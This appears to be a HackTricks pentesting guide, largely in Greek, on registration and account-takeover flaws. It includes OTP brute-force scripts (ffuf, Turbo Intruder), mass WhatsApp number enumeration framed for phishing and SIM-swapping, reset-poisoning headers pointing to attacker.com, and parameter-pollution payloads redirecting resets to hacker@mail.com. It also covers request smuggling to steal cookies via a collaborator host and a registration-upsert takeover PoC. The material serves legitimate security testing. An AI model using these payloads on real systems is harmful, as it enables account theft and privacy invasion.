# Registration & Takeover Vulnerabilities

{{#include ../banners/hacktricks-training.md}}

## Registration Takeover

### Duplicate Registration

- Προσπάθησε να δημιουργήσεις λογαριασμό χρησιμοποιώντας ένα υπάρχον username
- Έλεγξε παραλλαγές του email:
- uppercase
- +1@
- πρόσθεσε κάποια τελεία στο email
- ειδικοί χαρακτήρες στο μέρος του ονόματος του email (%00, %09, %20)
- Βάλε κενά μετά το email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Δοκίμασε tricks κανονικοποίησης παρόχων email (εξαρτάται από την υπηρεσία):
- Gmail αγνοεί τελείες και subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` παραδίδονται στο `victim@gmail.com`
- Κάποιοι πάροχοι είναι case-insensitive στο local-part
- Κάποιοι πάροχοι δέχονται unicode confusables. Δοκίμασε homoglyphs και soft hyphen `\u00AD` μέσα στο local-part
- Κακοποίησε αυτά για να: παρακάμψεις ελέγχους μοναδικότητας, λάβεις duplicate accounts/workspace invites, ή μπλοκάρεις εγγραφές του θύματος (προσωρινό DoS) ενώ προετοιμάζεις takeover

### Username Enumeration

Έλεγξε αν μπορείς να καταλάβεις πότε ένα username έχει ήδη καταχωρηθεί στην εφαρμογή.

- Διαφορετικά μηνύματα σφάλματος ή HTTP status codes
- Διαφορές χρόνου απόκρισης (ένας υπάρχων χρήστης μπορεί να προκαλέσει lookup σε IdP/DB)
- Το registration form μπορεί να συμπληρώνει αυτόματα στοιχεία προφίλ για γνωστά emails
- Έλεγξε τα team/invite flows: εισαγωγή email μπορεί να αποκαλύψει αν υπάρχει account

### Password Policy

Κατά τη δημιουργία χρήστη έλεγξε την πολιτική password (έλεγξε αν μπορείς να χρησιμοποιήσεις αδύναμα passwords).\
Σε αυτή την περίπτωση μπορείς να προσπαθήσεις να bruteforce credentials.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)to learn how to attempt account takeovers or extract information via **SQL Injections** in registry forms.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

Όταν έχεις εγγραφεί προσπάθησε να αλλάξεις το email και έλεγξε αν αυτή η αλλαγή επικυρώνεται σωστά ή αν μπορείς να το αλλάξεις σε οποιοδήποτε email.

### More Checks

- Έλεγξε αν μπορείς να χρησιμοποιήσεις **disposable emails** (mailinator, yopmail, 1secmail, κ.λπ.) ή να παρακάμψεις το blocklist με subaddressing όπως `victim+mailinator@gmail.com`
- **Long** **password** (>200) οδηγεί σε **DoS**
- **Έλεγξε rate limits στη δημιουργία λογαριασμών**
- Χρησιμοποίησε username@**burp_collab**.net και ανέλυσε το **callback**
- Αν χρησιμοποιείται επαλήθευση τηλεφώνου, έλεγξε edge cases parsing/injection για αριθμούς τηλεφώνου

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

Phone-number–centric messengers εκθέτουν ένα **presence oracle** όποτε ο client συγχρονίζει επαφές. Επαναλήψεις στα discovery requests του WhatsApp ιστορικά παρείχαν **>100M lookups per hour**, επιτρέποντας σχεδόν πλήρεις account enumerations.

**Attack workflow**

1. **Instrument an official client** για να καταγράψεις το request upload του address-book (authenticated blob κανονικοποιημένων E.164 numbers). Επανάλαβέ το με αριθμούς που δημιουργείς εσύ ενώ επαναχρησιμοποιείς τα ίδια cookies/device token.
2. **Ομαδοποίησε numbers ανά request**: το WhatsApp δέχεται χιλιάδες identifiers και επιστρέφει registered/unregistered μαζί με metadata (business, companion, κ.λπ.). Ανάλυσε τις απαντήσεις offline για να χτίσεις λίστες στόχων χωρίς να στέλνεις μηνύματα στα θύματα.
3. **Κλιμάκωσε οριζόντια** την enumeration με SIM banks, cloud devices, ή residential proxies ώστε να μην ενεργοποιείται throttling ανά account/IP/ASN.

**Dialing-plan modeling**

Μοντελοποίησε το dialing plan κάθε χώρας για να παραλείψεις άκυρους υποψήφιους. Το NDSS dataset (`country-table.*`) περιλαμβάνει country codes, adoption density, και platform split ώστε να μπορείς να προτεραιοποιήσεις περιοχές με υψηλό hit rate. Example seeding code:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Προτεραιοποιήστε πρόθεματα που ταιριάζουν με πραγματικές κατανομές (Mobile Country Code + National Destination Code) πριν ρωτήσετε το oracle, ώστε το throughput να παραμένει χρήσιμο.

**Turning enumerations into targeted attacks**

- Τροφοδοτήστε leaked phone numbers (π.χ. Facebook’s 2021 breach) στο oracle για να μάθετε ποιες ταυτότητες είναι ακόμα ενεργές πριν από phishing, SIM-swapping ή spamming.
- Φιλτράρετε τα censuses ανά χώρα/OS/τύπο εφαρμογής για να βρείτε περιοχές με αδύναμο SMS filtering ή μεγάλη υιοθέτηση του WhatsApp Business για localized social engineering.

**Public-key reuse correlation**

Το WhatsApp εκθέτει το X25519 identity key κάθε λογαριασμού κατά τη διάρκεια της session setup. Ζητήστε identity material για κάθε αριθμό που έχετε enumerated και αφαιρέστε διπλότυπα στα public keys για να αποκαλύψετε account farms, cloned clients ή insecure firmware — κοινά keys deanonymize multi-SIM operations.

## Αδύναμη επαλήθευση Email/Phone (OTP/Magic Link)

Οι ροές εγγραφής συχνά επαληθεύουν την ιδιοκτησία μέσω ενός αριθμητικού OTP ή ενός magic-link token. Τυπικά σφάλματα:

- Εύκολα μαντεύσιμο ή σύντομο OTP (4–6 digits) χωρίς αποτελεσματικό rate limiting ή IP/device tracking. Δοκιμάστε παράλληλες εικασίες και περιστροφή header/IP.
- Επαναχρησιμοποίηση OTP σε διαφορετικές ενέργειες ή λογαριασμούς, ή να μην είναι δεσμευμένο σε συγκεκριμένο χρήστη/ενέργεια (π.χ. same code works for login and signup, ή λειτουργεί μετά την αλλαγή email).
- Multi-value smuggling: μερικά backends αποδέχονται πολλαπλούς κωδικούς και επαληθεύουν αν κάποιος ταιριάζει. Try:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: διακρίνετε wrong vs expired vs wrong-user codes με βάση status/message/body length.
- Tokens που δεν αναιρούνται μετά την επιτυχία ή μετά την αλλαγή password/email.
- Το verification token δεν είναι δεμένο με user agent/IP, επιτρέποντας cross-origin completion από attacker-controlled pages.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Παράλληλη/ταυτόχρονη guessing για παράκαμψη sequential lockouts (χρησιμοποιήστε Turbo Intruder στο Burp):

<details>
<summary>Turbo Intruder απόσπασμα για flood 6‑digit OTP attempts</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: υποβάλετε το ίδιο έγκυρο OTP ταυτόχρονα σε δύο sessions· μερικές φορές μία συνεδρία γίνεται verified attacker account ενώ το victim flow επίσης πετυχαίνει.
- Δοκιμάστε επίσης Host header poisoning σε verification links (όπως το reset poisoning παρακάτω) για να leak ή να ολοκληρώσετε verification σε attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

A powerful class of issues occurs when an attacker performs actions on the victim’s email before the victim creates their account, then regains access later.

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
  - Attacker: δημιουργεί έναν classic account με το victim email και ορίζει password
  - Victim: εγγράφεται αργότερα με SSO (ίδιο email)
  - Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
  - Attacker: creates account and holds a long‑lived session (don’t log out)
  - Victim: recovers/sets password and uses the account
  - Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
  - Attacker: adds a secondary identifier to the pre‑created account (phone, additional email, or links attacker’s IdP)
  - Victim: resets password; attacker later uses the trojan identifier to reset/login
- Unexpired Email Change
  - Attacker: initiates email‑change to attacker mail and withholds confirmation
  - Victim: recovers the account and starts using it
  - Attacker: later completes the pending email‑change to steal the account
- Non‑Verifying IdP
  - Attacker: uses an IdP that does not verify email ownership to assert `victim@…`
  - Victim: signs up via classic route
  - Service merges on email without checking `email_verified` or performing local verification

Πρακτικές συμβουλές

- Συλλέξτε flows και endpoints από web/mobile bundles. Αναζητήστε classic signup, SSO linking, email/phone change, και password reset endpoints.
- Δημιουργήστε ρεαλιστική αυτοματοποίηση για να διατηρείτε sessions ενεργά ενώ ελέγχετε άλλες ροές.
- Για SSO tests, στήστε έναν test OIDC provider και εκδώστε tokens με `email` claims για τη διεύθυνση του victim και `email_verified=false` για να ελέγξετε αν το RP εμπιστεύεται unverified IdPs.
- Μετά από οποιοδήποτε password reset ή αλλαγή email, επιβεβαιώστε ότι:
  - όλα τα άλλα sessions και tokens είναι invalidated,
  - οι εκκρεμείς δυνατότητες αλλαγής email/phone έχουν ακυρωθεί,
  - τα προηγουμένως linked IdPs/emails/phones έχουν επαληθευτεί εκ νέου.

Note: Extensive methodology and case studies of these techniques are documented by Microsoft’s pre‑hijacking research (see References at the end).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR σε API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Ο επιτιθέμενος πρέπει να συνδεθεί με τον λογαριασμό του και να πάει στη λειτουργία **Change password**.
2. Ξεκινήστε το Burp Suite και Intercept το request\
3. Στείλτε το στο repeater tab και επεξεργαστείτε τις παραμέτρους : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Αδύναμο token επαναφοράς κωδικού <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Το password reset token θα πρέπει να δημιουργείται τυχαία και να είναι μοναδικό κάθε φορά.\
Προσπαθήστε να καθορίσετε αν το token λήγει ή αν είναι πάντα το ίδιο — σε κάποιες περιπτώσεις ο αλγόριθμος γεννήτριας είναι αδύναμος και μπορεί να μαντευτεί. Οι παρακάτω μεταβλητές μπορεί να χρησιμοποιούνται από τον αλγόριθμο.

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Trigger ένα αίτημα επαναφοράς κωδικού χρησιμοποιώντας το API/UI για ένα συγκεκριμένο email π.χ.: test@mail.com
2. Inspect την απάντηση του server και ελέγξτε για `resetToken`
3. Στη συνέχεια χρησιμοποιήστε το token σε ένα URL όπως `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Επαναφορά κωδικού μέσω Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Εγγραφείτε στο σύστημα με ένα username ίδιο με το username του θύματος, αλλά με κενά εισαγμένα πριν και/ή μετά το username. π.χ: `"admin "`
2. Ζητήστε επαναφορά κωδικού με το κακόβουλο username σας.
3. Χρησιμοποιήστε το token που στάλθηκε στο email σας και επαναφέρετε τον κωδικό του θύματος.
4. Συνδεθείτε στον λογαριασμό του θύματος με τον νέο κωδικό.

Η πλατφόρμα CTFd ήταν ευάλωτη σε αυτή την επίθεση.\
Δείτε: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Βρείτε ένα XSS μέσα στην εφαρμογή ή σε ένα subdomain εάν τα cookies είναι scoped στο parent domain : `*.domain.com`
2. Leak το τρέχον **sessions cookie**
3. Authenticate ως ο χρήστης χρησιμοποιώντας το cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Χρησιμοποιήστε **smuggler** για να εντοπίσετε τον τύπο του HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Κατασκευάστε ένα request που θα overwrite το `POST / HTTP/1.1` με τα ακόλουθα δεδομένα:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` με στόχο να κάνετε open redirect τα θύματα στο burpcollab και να κλέψετε τα cookies τους\
3. Το τελικό request μπορεί να μοιάζει με το ακόλουθο
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Αναφορές Hackerone για την εκμετάλλευση αυτού του bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Κατάληψη λογαριασμού μέσω CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Δημιουργήστε ένα payload για το CSRF, π.χ.: “HTML φόρμα με αυτόματη υποβολή για αλλαγή κωδικού”
2. Στείλτε το payload

### Κατάληψη λογαριασμού μέσω JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token μπορεί να χρησιμοποιηθεί για την πιστοποίηση ενός χρήστη.

- Επεξεργαστείτε το JWT με άλλο User ID / Email
- Ελέγξτε για ασθενή υπογραφή JWT


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Ορισμένοι signup handlers κάνουν upsert όταν το παρεχόμενο email υπάρχει ήδη. Αν το endpoint αποδέχεται ένα ελάχιστο body με email και password και δεν επιβάλλει επαλήθευση ιδιοκτησίας, η αποστολή του email του θύματος θα αντικαταστήσει τον κωδικό τους pre-auth.

- Discovery: συγκομίστε ονόματα endpoint από bundled JS (ή mobile app traffic), και μετά fuzz-άρετε base paths όπως /parents/application/v4/admin/FUZZ χρησιμοποιώντας ffuf/dirsearch.
- Method hints: ένα GET που επιστρέφει μηνύματα όπως "Only POST request is allowed." συχνά υποδεικνύει το σωστό verb και ότι αναμένεται JSON body.
- Minimal body observed in the wild:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Παράδειγμα PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Επίπτωση: Πλήρης Account Takeover (ATO) χωρίς κανένα reset token, OTP ή επαλήθευση email.

## Αναφορές

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
